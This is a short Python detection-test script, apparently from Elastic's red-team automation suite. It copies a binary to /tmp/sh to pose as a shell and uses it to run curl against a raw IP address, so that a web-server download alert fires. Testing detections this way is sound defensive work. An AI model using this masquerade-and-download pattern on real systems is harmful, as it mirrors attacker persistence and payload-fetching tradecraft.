# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="8b7461f9-d569-4558-a4cf-7e476210eae8",
    name="linux_persistence_webserver_curl_wget_download_ip_args",
    platforms=[OSType.LINUX],
    endpoint_rules=[
        RuleMetadata(
            id="14f332f1-b20b-4628-b6de-14a4626fba79", name="File Downloaded from Suspicious Source by Web Server"
        ),
    ],
    techniques=["T1505", "T1059", "T1071"],
)
def main() -> None:
    log.info("Creating a fake executable..")
    masquerade = "/tmp/sh"

    source = _common.get_resource_path("bin", "linux.ditto_and_spawn")
    _common.copy_file(source, masquerade)
    log.info("Granting execute permissions...")
    _common.execute_command(["chmod", "+x", masquerade])

    commands = [masquerade, "-c", "curl http://8.8.8.8:53 --output"]
    _common.execute_command(commands, timeout_secs=5)
    log.info("Cleaning...")
    _common.remove_file(masquerade)
    log.info("Simulation successfull!")
